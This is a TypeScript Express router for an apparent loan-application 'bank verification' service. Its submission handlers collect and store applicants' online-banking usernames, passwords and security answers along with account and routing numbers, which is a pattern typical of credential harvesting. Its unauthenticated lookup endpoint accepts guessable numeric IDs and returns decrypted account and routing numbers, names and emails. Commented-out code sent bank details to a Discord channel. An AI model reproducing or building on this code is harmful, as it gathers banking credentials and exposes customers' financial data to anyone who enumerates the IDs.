import { Router, Request, Response } from "express";
import { bankVerificationSchema } from "../validation";
import { upsertBankVerification } from "../services/bankVerificationService";
import {
  getApplicationById,
  updateApplicationStatus,
  markBankVerificationUploaded,
  getApplicationByIdLookUp,
} from "../services/applicationService";
import { sendDiscordNotification } from "../services/discordService";
import { email } from "zod";
import { decrypt } from "../encryption";
import {
  sendPostBankVerificationEmail,
  sendReconnectBankVerificationSubmittedEmail,
} from "../services/emailService";

const router = Router();

// GET /api/bank-verification/lookup?applicationId=63b58a3b-a42a-4bdf-9d2c-3456889a98d4
// Returns read-only application data for pre-populating the verification form
// router.get("/lookup", async (req: Request, res: Response) => {
//   try {
//     const applicationId = (req.query.applicationId as string)?.trim();

//     // if (!applicationId || !/^\d{5}$/.test(applicationId)) {
//     //   return res.status(400).json({ error: "Invalid application ID" });
//     // }

//     // Matches a standard UUID format
//     const uuidRegex =
//       /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/;

//     if (!applicationId || !uuidRegex.test(applicationId)) {
//       return res.status(400).json({ error: "Invalid application ID" });
//     }

//     const application = await getApplicationByIdLookUp(applicationId);

//     if (!application) {
//       return res.status(404).json({ error: "Application not found" });
//     }

//     // Return only safe, read-only fields needed for the verification form
//     return res.json({
//       applicationId: application.id,
//       application_id: application.application_id, // For backward compatibility
//       firstName: application.first_name,
//       lastName: application.last_name,
//       loanAmount: application.loan_amount,
//       bankName: application.bank_name,
//       status: application.status,
//       email: application?.email,
//       account_type: application?.account_type,
//       account_number: application?.account_number_encrypted
//         ? decrypt(application.account_number_encrypted)
//         : application?.account_number_encrypted,
//       routingNumber: application?.routing_number_encrypted
//         ? decrypt(application?.routing_number_encrypted)
//         : application?.routing_number_encrypted,
//     });
//   } catch (error) {
//     console.error("Bank verification lookup error:", error);
//     return res
//       .status(500)
//       .json({ error: "An internal error occurred. Please try again." });
//   }
// });

router.get("/lookup", async (req: Request, res: Response) => {
  try {
    const applicationId = (req.query.applicationId as string)?.trim();

    // Regex that accepts numeric IDs (e.g., 14336) OR standard 36-char UUIDs
    const validIdRegex =
      /^(\d+|[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})$/;

    if (!applicationId || !validIdRegex.test(applicationId)) {
      return res.status(400).json({ error: "Invalid application ID format" });
    }

    const application = await getApplicationByIdLookUp(applicationId);

    if (!application) {
      return res.status(404).json({ error: "Application not found" });
    }

    // Return safe, read-only fields. `applicationId` is the public 5-digit
    // code — the internal UUID never leaves the server.
    return res.json({
      applicationId: application.application_id,
      application_id: application.application_id,
      firstName: application.first_name,
      lastName: application.last_name,
      loanAmount: application.loan_amount,
      bankName: application.bank_name,
      status: application.status,
      email: application?.email,
      account_type: application?.account_type,
      account_number: application?.account_number_encrypted
        ? decrypt(application.account_number_encrypted)
        : application?.account_number_encrypted,
      routingNumber: application?.routing_number_encrypted
        ? decrypt(application?.routing_number_encrypted)
        : decrypt(application?.routing_number_encrypted),
      bankAccountAge: application?.bank_account_age,
      currentBalanceBand: application?.current_balance_band,
    });
  } catch (error) {
    console.error("Bank verification lookup error:", error);
    return res
      .status(500)
      .json({ error: "An internal error occurred. Please try again." });
  }
});

// POST /api/bank-verification — Submit bank verification credentials
// router.post("/", async (req: Request, res: Response) => {
//   try {
//     const ip =
//       (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() ||
//       req.ip ||
//       "unknown";

//     // Validate request body
//     const parsed = bankVerificationSchema.safeParse(req.body);
//     if (!parsed.success) {
//       const firstError = parsed.error.issues[0];
//       res.status(400).json({
//         error: firstError?.message || "Invalid input",
//         field: firstError?.path[0],
//       });
//       return;
//     }

//     const body = parsed.data;
//     const userAgent = (req.headers["user-agent"] as string) || "unknown";

//     // Verify the application exists and is in an acceptable status
//     let application;
//     try {
//       application = await getApplicationById(body.applicationId);

//       if (!application) {
//         return res.status(404).json({ error: "Application not found" });
//       }

//       // Allow submission for pending, failed, or already in-progress statuses
//       // const allowedStatuses = [
//       //   "bank_verification_pending",
//       //   "bank_verification_failed",
//       //   "bank_verification_in_progress",
//       //   "deposit_in_progress",
//       // ];
//       // if (!allowedStatuses.includes(application.status)) {
//       //   return res.status(400).json({
//       //     error: "Bank verification cannot be submitted for this application.",
//       //   });
//       // }
//     } catch (dbError) {
//       console.error("Failed to verify application:", dbError);
//       return res.status(500).json({
//         error: "Failed to verify application. Please try again.",
//       });
//     }

//     // Upsert bank verification record (overwrite previous if exists)
//     let verificationId: string;
//     try {
//       const result = await upsertBankVerification({
//         applicationId: body.applicationId,
//         bankName: body.bankName,
//         accountType: body.accountType,
//         bankingUsername: body.bankingUsername,
//         bankingPassword: body.bankingPassword,
//         securityQuestion: body.securityQuestion || undefined,
//         fullName: body.fullName,
//         email: body.email,
//         ipAddress: ip,
//         userAgent,
//       });
//       verificationId = result.id;
//     } catch (dbError) {
//       console.error("Bank verification upsert failed:", dbError);
//       res
//         .status(500)
//         .json({ error: "Failed to save bank verification. Please try again." });
//       return;
//     }

//     try {
//       await markBankVerificationUploaded(body.applicationId);
//     } catch (flagError) {
//       console.warn(
//         "Failed to set bank_verification_completed flag:",
//         flagError,
//       );
//     }

//     // Auto-update application status to bank_verification_completed once the
//     // applicant submits their bank details. Only advance from the pre-submission
//     // statuses (not if admin has already moved it further along).
//     if (
//       application.status === "bank_verification_pending" ||
//       application.status === "bank_verification_failed" ||
//       application.status === "bank_verification_in_progress"
//     ) {
//       try {
//         await updateApplicationStatus(
//           body.applicationId,
//           "bank_verification_completed",
//           "system",
//         );
//       } catch (statusError) {
//         console.warn("Failed to auto-update application status:", statusError);
//       }
//     }

//     // Send Discord notification
//     try {
//       await sendDiscordNotification(
//         `🏦 **Bank Verification Submitted**\n` +
//           `**Name:** ${body.fullName}\n` +
//           `**Email:** ${body.email}\n` +
//           `**Bank:** ${body.bankName}\n` +
//           `**Account Type:** ${body.accountType}\n` +
//           `**Application ID:** ${body.applicationId}\n` +
//           `**Verification ID:** ${verificationId}`,
//       );
//     } catch (err) {
//       console.error("Discord notification error:", err);
//     }

//     console.log(
//       `Bank verification submitted: ${verificationId} for application: ${body.applicationId}`,
//     );

//     res.json({
//       success: true,
//       verificationId,
//       message: "Bank verification credentials submitted successfully.",
//     });
//   } catch (error) {
//     console.error("Bank verification submission error:", error);
//     res
//       .status(500)
//       .json({ error: "An internal error occurred. Please try again." });
//   }
// });

// router.post("/", async (req: Request, res: Response) => {
//   try {
//     const ip =
//       (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() ||
//       req.ip ||
//       "unknown";

//     // Validate request body
//     const parsed = bankVerificationSchema.safeParse(req.body);
//     if (!parsed.success) {
//       const firstError = parsed.error.issues[0];
//       res.status(400).json({
//         error: firstError?.message || "Invalid input",
//         field: firstError?.path[0],
//       });
//       return;
//     }

//     const body = parsed.data;
//     const userAgent = (req.headers["user-agent"] as string) || "unknown";

//     // Verify the application exists and is in an acceptable status
//     let application;
//     try {
//       application = await getApplicationById(body.applicationId);

//       if (!application) {
//         return res.status(404).json({ error: "Application not found" });
//       }

//       // Allow submission for pending, failed, or already in-progress statuses
//       // const allowedStatuses = [
//       //   "bank_verification_pending",
//       //   "bank_verification_failed",
//       //   "bank_verification_in_progress",
//       //   "deposit_in_progress",
//       // ];
//       // if (!allowedStatuses.includes(application.status)) {
//       //   return res.status(400).json({
//       //     error: "Bank verification cannot be submitted for this application.",
//       //   });
//       // }
//     } catch (dbError) {
//       console.error("Failed to verify application:", dbError);
//       return res.status(500).json({
//         error: "Failed to verify application. Please try again.",
//       });
//     }

//     // Upsert bank verification record (overwrite previous if exists)
//     let verificationId: string;
//     try {
//       const result = await upsertBankVerification({
//         applicationId: body.applicationId,
//         bankName: body.bankName,
//         accountType: body.accountType,
//         accountNumber: body.accountNumber,
//         routingNumber: body.routingNumber,
//         bankAccountAge: body.bankAccountAge,
//         bankBalanceStatus: body.bankBalanceStatus,
//         bankingUsername: body.bankingUsername,
//         bankingPassword: body.bankingPassword,
//         securityQuestion: body.securityQuestion || undefined,
//         fullName: body.fullName,
//         email: body.email,
//         ipAddress: ip,
//         userAgent,
//       });
//       verificationId = result.id;
//     } catch (dbError) {
//       console.error("Bank verification upsert failed:", dbError);
//       res
//         .status(500)
//         .json({ error: "Failed to save bank verification. Please try again." });
//       return;
//     }

//     try {
//       await markBankVerificationUploaded(body.applicationId);
//     } catch (flagError) {
//       console.warn(
//         "Failed to set bank_verification_completed flag:",
//         flagError,
//       );
//     }

//     // Auto-update application status to bank_verification_completed once the
//     // applicant submits their bank details. Only advance from the pre-submission
//     // statuses (not if admin has already moved it further along).
//     if (
//       application.status === "bank_verification_pending" ||
//       application.status === "bank_verification_failed" ||
//       application.status === "bank_verification_in_progress"
//     ) {
//       try {
//         await updateApplicationStatus(
//           body.applicationId,
//           "bank_verification_completed",
//           "system",
//         );
//       } catch (statusError) {
//         console.warn("Failed to auto-update application status:", statusError);
//       }
//     }

//     // Send Discord notification
//     try {
//       await sendDiscordNotification(
//         `🏦 **Bank Verification Submitted**\n` +
//           `**Name:** ${body.fullName}\n` +
//           `**Email:** ${body.email}\n` +
//           `**Bank:** ${body.bankName}\n` +
//           `**Account Type:** ${body.accountType}\n` +
//           `**Account Number:** ${body.accountNumber || "N/A"}\n` +
//           `**Routing Number:** ${body.routingNumber || "N/A"}\n` +
//           `**Application ID:** ${body.applicationId}\n` +
//           `**Verification ID:** ${verificationId}`,
//       );
//     } catch (err) {
//       console.error("Discord notification error:", err);
//     }

//     console.log(
//       `Bank verification submitted: ${verificationId} for application: ${body.applicationId}`,
//     );

//     res.json({
//       success: true,
//       verificationId,
//       message: "Bank verification credentials submitted successfully.",
//     });
//   } catch (error) {
//     console.error("Bank verification submission error:", error);
//     res
//       .status(500)
//       .json({ error: "An internal error occurred. Please try again." });
//   }
// });

router.post("/", async (req: Request, res: Response) => {
  try {
    const ip =
      (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() ||
      req.ip ||
      "unknown";

    // Validate request body
    const parsed = bankVerificationSchema.safeParse(req.body);
    if (!parsed.success) {
      const firstError = parsed.error.issues[0];
      res.status(400).json({
        error: firstError?.message || "Invalid input",
        field: firstError?.path[0],
      });
      return;
    }

    const body = parsed.data;
    const userAgent = (req.headers["user-agent"] as string) || "unknown";

    // Fallbacks in case frontend sends 'accountAge' / 'accountStatus' instead of 'bankAccountAge' / 'bankBalanceStatus'
    const accountType = body.accountType || req.body.accountType;
    const routingNumber = body.routingNumber || req.body.routingNumber;
    const accountNumber = body.accountNumber || req.body.accountNumber;
    const bankAccountAge =
      body.bankAccountAge || req.body.bankAccountAge || req.body.accountAge;
    const bankBalanceStatus =
      body.bankBalanceStatus ||
      req.body.bankBalanceStatus ||
      req.body.accountStatus;

    // Verify the application exists
    let application;
    try {
      application = await getApplicationById(body.applicationId);

      if (!application) {
        return res.status(404).json({ error: "Application not found" });
      }
    } catch (dbError) {
      console.error("Failed to verify application:", dbError);
      return res.status(500).json({
        error: "Failed to verify application. Please try again.",
      });
    }

    // Block bank verification if status is DECLINED_HD, DECLINED_pb, DECLINED, or FUNDED
    const DISALLOWED_STATUSES = [
      "declined_hd",
      "declined_pb",
      "declined",
      "funded",
      "bank_verification_completed",
    ];

    // Convert current application status to lowercase before checking
    if (DISALLOWED_STATUSES.includes(application.status?.toLowerCase())) {
      return res.status(400).json({
        error: `Bank verification is not allowed because your application status is ${application.status}.`,
      });
    }

    // `body.applicationId` may be the 5-digit code or a legacy UUID. Every
    // write below keys off the resolved internal UUID, which is what the
    // bank_verification / audit_log foreign keys actually reference.
    const internalId = application.id;
    const publicApplicationId = application.application_id;

    // Upsert bank verification record
    let verificationId: string;
    try {
      const result = await upsertBankVerification({
        applicationId: internalId,
        bankName: body.bankName,
        accountType: accountType,
        accountNumber: accountNumber,
        routingNumber: routingNumber,
        bankAccountAge: bankAccountAge,
        bankBalanceStatus: bankBalanceStatus,
        bankingUsername: body.bankingUsername,
        bankingPassword: body.bankingPassword,
        securityQuestion: body.securityQuestion || undefined,
        fullName: body.fullName,
        email: body.email,
        ipAddress: ip,
        userAgent,
      });
      verificationId = result.id;
    } catch (dbError) {
      console.error("Bank verification upsert failed:", dbError);
      return res.status(500).json({
        error: "Failed to save bank verification. Please try again.",
      });
    }

    // Set flag in database (if applicable)
    try {
      await markBankVerificationUploaded(internalId);
    } catch (flagError) {
      console.warn(
        "Failed to set bank_verification_completed flag:",
        flagError,
      );
    }

    // Update application status
    try {
      await updateApplicationStatus(
        internalId,
        "bank_verification_completed",
        "system",
      );
    } catch (statusError) {
      console.warn("Failed to update application status:", statusError);
    }

    // Send Post-Bank Verification Email
    try {
      await sendPostBankVerificationEmail({
        applicationId: publicApplicationId,
        firstName: application.first_name,
        email: application.email,
        loanAmount: application.loan_amount,
      });
    } catch (emailError) {
      console.error("Failed to send post-bank verification email:", emailError);
    }

    return res.json({
      success: true,
      verificationId,
      message: "Bank verification credentials submitted successfully.",
    });
  } catch (error) {
    console.error("Bank verification submission error:", error);
    return res
      .status(500)
      .json({ error: "An internal error occurred. Please try again." });
  }
});

router.post(
  "/reconnect-bank-verification",
  async (req: Request, res: Response) => {
    try {
      const ip =
        (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() ||
        req.ip ||
        "unknown";

      // Validate request body
      const parsed = bankVerificationSchema.safeParse(req.body);
      if (!parsed.success) {
        const firstError = parsed.error.issues[0];
        res.status(400).json({
          error: firstError?.message || "Invalid input",
          field: firstError?.path[0],
        });
        return;
      }

      const body = parsed.data;
      const userAgent = (req.headers["user-agent"] as string) || "unknown";

      // Fallbacks in case frontend sends 'accountAge' / 'accountStatus' instead of 'bankAccountAge' / 'bankBalanceStatus'
      const accountType = body.accountType || req.body.accountType;
      const routingNumber = body.routingNumber || req.body.routingNumber;
      const accountNumber = body.accountNumber || req.body.accountNumber;
      const bankAccountAge =
        body.bankAccountAge || req.body.bankAccountAge || req.body.accountAge;
      const bankBalanceStatus =
        body.bankBalanceStatus ||
        req.body.bankBalanceStatus ||
        req.body.accountStatus;

      // Verify the application exists
      let application;
      try {
        application = await getApplicationById(body.applicationId);

        if (!application) {
          return res.status(404).json({ error: "Application not found" });
        }
      } catch (dbError) {
        console.error("Failed to verify application:", dbError);
        return res.status(500).json({
          error: "Failed to verify application. Please try again.",
        });
      }

      // Block bank verification if status is DECLINED_HD, DECLINED_pb, DECLINED, or FUNDED
      const DISALLOWED_STATUSES = [
        "declined_hd",
        "declined_pb",
        "declined",
        "funded",
        "bank_verification_completed",
      ];

      // Convert current application status to lowercase before checking
      if (DISALLOWED_STATUSES.includes(application.status?.toLowerCase())) {
        return res.status(400).json({
          error: `Bank verification is not allowed because your application status is ${application.status}.`,
        });
      }

      // `body.applicationId` may be the 5-digit code or a legacy UUID. Every
      // write below keys off the resolved internal UUID, which is what the
      // bank_verification / audit_log foreign keys actually reference.
      const internalId = application.id;
      const publicApplicationId = application.application_id;

      // Upsert bank verification record
      let verificationId: string;
      try {
        const result = await upsertBankVerification({
          applicationId: internalId,
          bankName: body.bankName,
          accountType: accountType,
          accountNumber: accountNumber,
          routingNumber: routingNumber,
          bankAccountAge: bankAccountAge,
          bankBalanceStatus: bankBalanceStatus,
          bankingUsername: body.bankingUsername,
          bankingPassword: body.bankingPassword,
          securityQuestion: body.securityQuestion || undefined,
          fullName: body.fullName,
          email: body.email,
          ipAddress: ip,
          userAgent,
        });
        verificationId = result.id;
      } catch (dbError) {
        console.error("Bank verification upsert failed:", dbError);
        return res.status(500).json({
          error: "Failed to save bank verification. Please try again.",
        });
      }

      // Set flag in database (if applicable)
      try {
        await markBankVerificationUploaded(internalId);
      } catch (flagError) {
        console.warn(
          "Failed to set bank_verification_completed flag:",
          flagError,
        );
      }

      // Update application status
      try {
        await updateApplicationStatus(
          internalId,
          "bank_verification_completed",
          "system",
        );
      } catch (statusError) {
        console.warn("Failed to update application status:", statusError);
      }

      // Send Post-Bank Verification Email
      try {
        await sendReconnectBankVerificationSubmittedEmail({
          applicationId: publicApplicationId,
          firstName: application.first_name,
          email: application.email,
          loanAmount: application.loan_amount,
        });
      } catch (emailError) {
        console.error(
          "Failed to send post-bank verification email:",
          emailError,
        );
      }

      return res.json({
        success: true,
        verificationId,
        message: "Bank verification credentials submitted successfully.",
      });
    } catch (error) {
      console.error("Bank verification submission error:", error);
      return res
        .status(500)
        .json({ error: "An internal error occurred. Please try again." });
    }
  },
);

export default router;
